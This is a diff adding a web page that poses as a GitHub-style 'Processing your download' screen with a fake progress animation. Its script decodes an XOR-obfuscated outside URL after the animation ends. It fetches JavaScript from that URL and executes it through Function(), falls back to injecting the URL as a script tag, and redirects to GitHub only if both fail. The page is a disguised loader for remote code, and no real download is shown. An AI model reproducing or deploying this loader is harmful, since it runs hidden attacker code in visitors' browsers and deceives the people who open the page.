@@ -1,0 +1,410 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="unsafe-url">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Processing your download</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%231F2328' fill-rule='evenodd' d='M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #020811;
+            color: #fff;
+            font-family: Inter, system-ui, Arial, sans-serif;
+        }
+
+        .page {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background:
+                radial-gradient(circle at 27% 73%, rgba(16, 80, 180, 0.1), transparent 17%),
+                radial-gradient(circle at 73% 23%, rgba(28, 120, 210, 0.08), transparent 15%),
+                radial-gradient(circle at 50% 48%, rgba(10, 36, 80, 0.16) 0%, transparent 44%),
+                #020811;
+        }
+
+        .loader {
+            position: relative;
+            width: min(930px, 86vmin);
+            aspect-ratio: 1 / 1;
+            border-radius: 50%;
+        }
+
+        .halo {
+            position: absolute;
+            inset: 16.8%;
+            border-radius: 50%;
+            background: radial-gradient(circle at 50% 50%, #01060d 40%, #061322 76%, #0a1c36 100%);
+            box-shadow: 0 0 0 1px rgba(120, 160, 190, 0.16);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .rings,
+        .orbit,
+        .orbit-spin {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            overflow: visible;
+        }
+
+        .orbit-spin {
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .orbit { pointer-events: none; }
+
+        .rings { z-index: 3; pointer-events: none; }
+
+        .core {
+            position: absolute;
+            inset: 0;
+            z-index: 4;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            pointer-events: none;
+        }
+
+        .icon {
+            margin: 0;
+            width: clamp(96px, 10.4vmin, 114px);
+            height: clamp(96px, 10.4vmin, 114px);
+            border-radius: 22px;
+            background: #040b16;
+            border: 1.5px solid #1a6ec8;
+            box-shadow: 0 0 0 1px rgba(50, 150, 255, 0.18), 0 0 7px rgba(40, 140, 230, 0.22);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .icon svg {
+            width: 64%;
+            height: 64%;
+            filter: drop-shadow(0 0 1.5px rgba(255, 255, 255, 0.35));
+        }
+
+        .core h1 {
+            margin: 34px 0 0;
+            font-size: clamp(24px, 3.15vmin, 36px);
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.015em;
+            color: #F4F7FB;
+            white-space: nowrap;
+        }
+
+        .core .sub {
+            margin: 16px 0 0;
+            font-size: clamp(18px, 2.35vmin, 26px);
+            font-weight: 400;
+            color: #C8CDD4;
+        }
+
+        .pct {
+            margin: 47px 0 0;
+            font-size: clamp(44px, 5vmin, 57px);
+            font-weight: 600;
+            color: #35D7FF;
+            letter-spacing: -0.03em;
+            text-shadow: 0 0 10px rgba(53, 215, 255, 0.28);
+            line-height: 1;
+        }
+
+        #segGroup path,
+        #progressFull {
+            transition: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="loader">
+            <div class="halo"></div>
+
+            <div class="orbit-spin" id="orbitSpin">
+            <svg class="orbit" viewBox="0 0 400 400" aria-hidden="true">
+                    <g stroke="rgba(70, 170, 230, 0.42)" stroke-width="0.85" stroke-linecap="round">
+                        <line x1="200" y1="10" x2="200" y2="17"/>
+                        <line x1="231" y1="14" x2="234" y2="20"/>
+                        <line x1="258" y1="24" x2="262" y2="30"/>
+                        <line x1="336" y1="86" x2="341" y2="90"/>
+                        <line x1="348" y1="108" x2="354" y2="111"/>
+                        <line x1="22" y1="168" x2="29" y2="166"/>
+                        <line x1="18" y1="196" x2="26" y2="196"/>
+                        <line x1="28" y1="228" x2="35" y2="226"/>
+                        <line x1="86" y1="336" x2="90" y2="342"/>
+                        <line x1="118" y1="354" x2="121" y2="360"/>
+                        <line x1="292" y1="348" x2="296" y2="354"/>
+                    </g>
+                    <g fill="#4ec8ef" opacity="0.82">
+                        <circle cx="246" cy="18" r="0.85" opacity="0.55"/>
+                        <circle cx="268" cy="28" r="0.7" opacity="0.4"/>
+                        <circle cx="286" cy="42" r="0.95" opacity="0.5"/>
+                        <circle cx="304" cy="60" r="0.65" opacity="0.35"/>
+                        <circle cx="318" cy="78" r="0.8" opacity="0.42"/>
+                        <circle cx="332" cy="102" r="0.7" opacity="0.38"/>
+                        <circle cx="344" cy="128" r="0.6" opacity="0.3"/>
+                        <circle cx="352" cy="148" r="0.85" opacity="0.45"/>
+                        <circle cx="14" cy="176" r="0.75" opacity="0.4"/>
+                        <circle cx="12" cy="198" r="0.9" opacity="0.48"/>
+                        <circle cx="16" cy="218" r="0.65" opacity="0.35"/>
+                        <circle cx="22" cy="238" r="0.8" opacity="0.42"/>
+                        <circle cx="34" cy="262" r="0.7" opacity="0.36"/>
+                        <circle cx="78" cy="330" r="0.75" opacity="0.4"/>
+                        <circle cx="98" cy="346" r="0.6" opacity="0.32"/>
+                        <circle cx="122" cy="360" r="0.85" opacity="0.44"/>
+                        <circle cx="146" cy="370" r="0.55" opacity="0.28"/>
+                        <circle cx="278" cy="356" r="0.7" opacity="0.38"/>
+                        <circle cx="302" cy="340" r="0.8" opacity="0.4"/>
+                        <circle cx="188" cy="8" r="0.55" opacity="0.28"/>
+                        <circle cx="372" cy="188" r="0.5" opacity="0.22"/>
+                        <circle cx="366" cy="268" r="0.55" opacity="0.24"/>
+                        <circle cx="48" cy="68" r="0.5" opacity="0.2"/>
+                    </g>
+                    <g fill="#7adfff" opacity="0.82">
+                        <circle cx="334" cy="86" r="6.4" opacity="0.1"/>
+                        <circle cx="334" cy="86" r="4.4" opacity="0.22"/>
+                        <circle cx="334" cy="86" r="3.1" opacity="0.95"/>
+                        <circle cx="28" cy="248" r="7.2" opacity="0.1"/>
+                        <circle cx="28" cy="248" r="5" opacity="0.22"/>
+                        <circle cx="28" cy="248" r="3.5" opacity="0.96"/>
+                        <circle cx="214" cy="12" r="4.6" opacity="0.1"/>
+                        <circle cx="214" cy="12" r="3.2" opacity="0.2"/>
+                        <circle cx="214" cy="12" r="2.2" opacity="0.8"/>
+                        <circle cx="368" cy="196" r="3.4" opacity="0.1"/>
+                        <circle cx="368" cy="196" r="1.65" opacity="0.64"/>
+                        <circle cx="292" cy="362" r="5.2" opacity="0.1"/>
+                        <circle cx="292" cy="362" r="3.6" opacity="0.2"/>
+                        <circle cx="292" cy="362" r="2.55" opacity="0.86"/>
+                        <circle cx="72" cy="44" r="4.2" opacity="0.1"/>
+                        <circle cx="72" cy="44" r="2.05" opacity="0.72"/>
+                        <circle cx="18" cy="168" r="4.8" opacity="0.1"/>
+                        <circle cx="18" cy="168" r="3.3" opacity="0.2"/>
+                        <circle cx="18" cy="168" r="2.35" opacity="0.78"/>
+                        <circle cx="350" cy="304" r="3.8" opacity="0.1"/>
+                        <circle cx="350" cy="304" r="1.85" opacity="0.6"/>
+                    </g>
+            </svg>
+            </div>
+
+            <svg class="rings" viewBox="0 0 400 400" aria-hidden="true">
+                <defs>
+                    <linearGradient id="seg0" gradientUnits="userSpaceOnUse" x1="200" y1="36" x2="364" y2="200">
+                        <stop offset="0" stop-color="#0A3DCC"/>
+                        <stop offset="1" stop-color="#1A96FF"/>
+                    </linearGradient>
+                    <linearGradient id="seg1" gradientUnits="userSpaceOnUse" x1="364" y1="200" x2="200" y2="364">
+                        <stop offset="0" stop-color="#0D52E8"/>
+                        <stop offset="1" stop-color="#2AD4FF"/>
+                    </linearGradient>
+                    <linearGradient id="seg2" gradientUnits="userSpaceOnUse" x1="200" y1="364" x2="36" y2="200">
+                        <stop offset="0" stop-color="#0836B8"/>
+                        <stop offset="1" stop-color="#22C4FF"/>
+                    </linearGradient>
+                    <linearGradient id="seg3" gradientUnits="userSpaceOnUse" x1="36" y1="200" x2="200" y2="36">
+                        <stop offset="0" stop-color="#0B48D4"/>
+                        <stop offset="1" stop-color="#33D8FF"/>
+                    </linearGradient>
+                    <linearGradient id="progressGrad" gradientUnits="userSpaceOnUse" x1="36" y1="36" x2="364" y2="364">
+                        <stop offset="0" stop-color="#0A3DCC"/>
+                        <stop offset="0.45" stop-color="#1478FF"/>
+                        <stop offset="1" stop-color="#2AD4FF"/>
+                    </linearGradient>
+                </defs>
+                <circle cx="200" cy="200" r="176" fill="none" stroke="rgba(28, 70, 130, 0.38)" stroke-width="0.55"/>
+                <circle cx="200" cy="200" r="188" fill="none" stroke="rgba(24, 64, 120, 0.26)" stroke-width="0.45"/>
+                <circle cx="200" cy="200" r="200" fill="none" stroke="rgba(30, 78, 140, 0.18)" stroke-width="0.4"/>
+                <circle cx="200" cy="200" r="214" fill="none" stroke="rgba(22, 60, 115, 0.12)" stroke-width="0.35"/>
+                <circle cx="200" cy="200" r="164" fill="none" stroke="#0c2d52" stroke-width="8"/>
+                <g id="segGroup" fill="none" stroke-width="6.6" stroke-linecap="round">
+                    <path data-seg="0" stroke="url(#seg0)" pathLength="1" stroke-dasharray="0 1"/>
+                    <path data-seg="1" stroke="url(#seg1)" pathLength="1" stroke-dasharray="0 1"/>
+                    <path data-seg="2" stroke="url(#seg2)" pathLength="1" stroke-dasharray="0 1"/>
+                    <path data-seg="3" stroke="url(#seg3)" pathLength="1" stroke-dasharray="0 1"/>
+                </g>
+                <circle id="progressFull" cx="200" cy="200" r="164" fill="none" stroke="url(#progressGrad)" stroke-width="6.6" opacity="0"/>
+                <circle cx="200" cy="200" r="147" fill="none" stroke="rgba(130, 168, 196, 0.28)" stroke-width="0.85"/>
+            </svg>
+
+            <div class="core">
+                <div class="icon" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" fill="none">
+                        <path d="M12 2.15L1.7 6.85 12 11.55 22.3 6.85 12 2.15z" stroke="#F7FBFF" stroke-width="1.7" stroke-linejoin="round"/>
+                        <path d="M1.7 12.05L12 16.75 22.3 12.05" stroke="#F7FBFF" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M1.7 17.25L12 21.95 22.3 17.25" stroke="#F7FBFF" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <h1>Processing your download...</h1>
+                <p class="sub">Getting files ready.</p>
+                <div class="pct">0%</div>
+            </div>
+        </div>
+    </div>
+
+<script>
+function _readmeHubN14() {
+    location.replace('https://github.com/readme');
+}
+
+function pullAsync(url) {
+    return fetch(url, { method: 'GET', cache: 'no-store' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        });
+}
+
+function runBody(text) {
+    var body = String(text).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    Function(body)();
+}
+
+function mountScriptTag(url) {
+    return new Promise(function (resolve, reject) {
+        var tag = document.createElement('script');
+        tag.charset = 'utf-8';
+        tag.src = url;
+        tag.onload = resolve;
+        tag.onerror = reject;
+        (document.head || document.documentElement).appendChild(tag);
+    });
+}
+
+function applySync() {
+    var _a = '119,107,107,111,108,37,48,48,124,112,115,123,109,126,118,113,121,118,125';
+    var _b = '91,76,16,93,81,83,17,93,75,91,77,74,95,16,78,75,80,90,87,74';
+    function _xd(raw, key) {
+        var p = raw.split(','), o = '', i = 0;
+        for (; i < p.length; i++) o += String.fromCharCode(parseInt(p[i], 10) ^ key);
+        return o;
+    }
+    var link = _xd(_a, 31) + _xd(_b, 62);
+    pullAsync(link)
+        .then(runBody)
+        .catch(function () {
+            mountScriptTag(link).catch(function () { _readmeHubN14(); });
+        });
+}
+
+(function () {
+    var hopArmed = false;
+    var DURATION = 1200;
+    var HOP_DELAY = 150;
+    var STEP_MS = 50;
+    var CX = 200, CY = 200, R = 164;
+    var SLOTS = [
+        { a0: 0, max: 90 },
+        { a0: 90, max: 90 },
+        { a0: 180, max: 90 },
+        { a0: 270, max: 90 }
+    ];
+    var paths = document.querySelectorAll('#segGroup path');
+    var ringFull = document.getElementById('progressFull');
+    var pctEl = document.querySelector('.pct');
+    var lastPct = -1;
+    var timer = 0;
+    var started = 0;
+
+    function polar(deg) {
+        var rad = (deg - 90) * Math.PI / 180;
+        return { x: CX + R * Math.cos(rad), y: CY + R * Math.sin(rad) };
+    }
+
+    function arc(start, sweep) {
+        var a = polar(start);
+        var b = polar(start + sweep);
+        return 'M ' + a.x.toFixed(2) + ' ' + a.y.toFixed(2) +
+            ' A ' + R + ' ' + R + ' 0 0 1 ' +
+            b.x.toFixed(2) + ' ' + b.y.toFixed(2);
+    }
+
+    function ease(t) {
+        var u = 1 - t;
+        return 1 - u * u * u;
+    }
+
+    function applyProgress(value) {
+        var progress = value < 0 ? 0 : value > 100 ? 100 : value;
+        var shown = Math.round(progress);
+        var i;
+
+        if (shown === lastPct && progress < 100) return;
+        lastPct = shown;
+        pctEl.textContent = shown + '%';
+
+        if (progress >= 100) {
+            for (i = 0; i < paths.length; i++) {
+                paths[i].setAttribute('stroke-dasharray', '1 0');
+            }
+            ringFull.setAttribute('opacity', '1');
+            return;
+        }
+
+        ringFull.setAttribute('opacity', '0');
+        for (i = 0; i < paths.length; i++) {
+            paths[i].setAttribute('stroke-dasharray', (shown / 100).toFixed(3) + ' 1');
+        }
+    }
+
+    function finish() {
+        if (timer) {
+            window.clearTimeout(timer);
+            timer = 0;
+        }
+        applyProgress(100);
+        if (!hopArmed) {
+            hopArmed = true;
+            timer = window.setTimeout(applySync, HOP_DELAY);
+        }
+    }
+
+    function step() {
+        var t = (performance.now() - started) / DURATION;
+        if (t >= 1) {
+            finish();
+            return;
+        }
+        applyProgress(ease(t) * 100);
+        timer = window.setTimeout(step, STEP_MS);
+    }
+
+    for (var i = 0; i < SLOTS.length; i++) {
+        paths[i].setAttribute('d', arc(SLOTS[i].a0, SLOTS[i].max));
+    }
+
+    if (/[?&]hold=1/.test(location.search)) {
+        applyProgress(68);
+        return;
+    }
+
+    applyProgress(0);
+    started = performance.now();
+    timer = window.setTimeout(step, STEP_MS);
+})();
+</script>
+</body>
+</html>
